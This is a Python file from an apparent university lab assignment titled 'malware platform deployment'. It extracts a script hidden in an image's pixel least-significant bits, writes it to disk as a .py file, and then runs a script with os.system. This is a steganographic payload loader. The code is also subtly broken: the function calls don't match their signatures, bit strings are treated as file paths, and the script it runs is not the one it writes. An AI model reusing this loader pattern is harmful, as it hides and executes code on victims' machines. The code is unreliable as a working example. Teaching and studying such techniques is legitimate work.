# Decoder File
# Caleb Millard
# Lab 7 CMPT 360
# Title: malware platform deployment
# Dr Rick Sutcliffe
# Program 2/2


from PIL import Image
import os
import codecs


def decode_message(image_path):
    # Open the image
    image = Image.open(image_path)

    # Get the size of the image
    width, height = image.size

    # Iterate through each pixel in the image and extract the binary message
    binary_message = ""
    for y in range(height):
        for x in range(width):
            pixel = image.getpixel((x, y))

            # Extract the least significant bit from each RGB channel
            for i in range(3):  # Loop through R, G, B channels
                binary_message += str(pixel[i] & 1)
    decode_binary_bytes(binary_message)


##########################
# converts seperated bytes into utf8 text which can be exported as a python script
#############################
def decode_binary_bytes(input_file):
    binary_bytes = split_binary_file(input_file)
    utf8_string = ""

    for binary_byte in binary_bytes:
        binary_byte = (
            binary_byte.strip()
        )  # Remove leading/trailing whitespaces and line breaks

        # Check if binary byte is exactly 8 digits long
        if len(binary_byte) != 8:
            print(f"Warning: Skipping invalid binary byte '{binary_byte}'")
            continue

        # Convert binary byte to UTF-8 encoded character
        try:
            utf8_byte = codecs.decode(int(binary_byte, 2).to_bytes(1, "big"), "utf-8")
            utf8_string += utf8_byte
        except ValueError:
            print(
                f"Error: Failed to convert binary byte '{binary_byte}' to UTF-8 encoded character"
            )

    with open(output_file, "w") as file:
        file.write(utf8_string)


#######################
# splits a binary file into binary bytes and returns them to be converted into UTF-8
########################


def split_binary_file(input_file):
    with open(input_file, "r") as file:
        binary_string = file.read().replace("\n", "")
        # Read binary string from file and remove line breaks

    binary_bytes = []
    num_bits = len(binary_string)
    # seperate the bits into 8bit byte format
    for i in range(0, num_bits, 8):
        binary_byte = binary_string[i : i + 8]
        binary_bytes.append(binary_byte)
    return binary_bytes


input_file = "Downloads/header.jpeg"
output_file = "H:/CMPT 360/New folder/product.py"
split_binary_file(input_file, output_file)
print(f"Conversion complete. UTF-8 text written to '{output_file}'")
decode_message(input_file)
os.system('cmd /k "basecamp.py"')
